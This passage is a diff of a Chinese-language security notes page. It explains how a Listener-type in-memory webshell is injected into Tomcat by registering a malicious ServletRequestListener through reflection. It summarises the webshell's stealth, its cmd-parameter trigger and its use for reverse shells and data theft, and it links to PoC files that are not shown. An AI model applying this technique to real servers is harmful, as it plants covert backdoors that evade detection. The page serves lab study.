+<p>Listener 型内存马的本质是：利用反射获取 Tomcat 的 StandardContext，在运行时动态注册一个 ServletRequestListener，使其监听每一次请求的创建事件。当请求到达时，恶意 Listener 自动执行，无需绑定任何 URL，是三种内存马中隐蔽性最高、代码量最少、但回显也最复杂的一种。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>要点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>注册最简单</td>
+<td><code>standardContext.addApplicationEventListener(listener)</code> 即可</td>
+</tr>
+<tr>
+<td>触发无路径要求</td>
+<td>任何请求 + cmd 参数都能触发</td>
+</tr>
+<tr>
+<td>回显最复杂</td>
+<td>需要借助 request 属性 + 回显页面、文件或外带数据</td>
+</tr>
+<tr>
+<td>检测最困难</td>
+<td>无 URL 绑定，流量审计难以发现</td>
+</tr>
+<tr>
+<td>最适合</td>
+<td>监控型后门、无回显场景（如反弹 Shell、数据窃取）</td>
+</tr>
+</tbody>
+</table>
+<h2 id="_6">实战<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<p><strong>环境</strong>：docker搭建Tomcat容器
+<img alt="" src="2026-07-12-19-06-01.png" /></p>
+<p><strong>PoC</strong></p>
+<p><em>注入器</em>
+<a href="../../../../code-attachment/memory-shell-code/minidemo/Listener.jsp"></a>
+<em>回显页面</em>
+<a href="../../../../code-attachment/memory-shell-code/minidemo/ListenerResult.jsp"></a></p>
+<p><strong>注入</strong></p>
+<p><img alt="" src="2026-07-12-21-55-09.png" />
+<img alt="" src="2026-07-12-21-55-15.png" /></p>
+<p><strong>访问</strong></p>
+<p><img alt="" src="2026-07-12-22-17-10.png" /></p>
 
 
 
@@ -2874,7 +3142,7 @@
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 7, 2026 22:57:41 UTC"><span class="timeago" datetime="2026-07-07T22:57:41+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 7, 2026 22:57:41 UTC">2026-07-07</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 12, 2026 14:53:08 UTC"><span class="timeago" datetime="2026-07-12T14:53:08+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 12, 2026 14:53:08 UTC">2026-07-12</span>
   </span>
 
     
@@ -2884,7 +3152,7 @@
     <span class="md-icon" title="Created">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 7, 2026 22:57:41 UTC"><span class="timeago" datetime="2026-07-07T22:57:41+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 7, 2026 22:57:41 UTC">2026-07-07</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 12, 2026 14:53:08 UTC"><span class="timeago" datetime="2026-07-12T14:53:08+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 12, 2026 14:53:08 UTC">2026-07-12</span>
   </span>
 
     
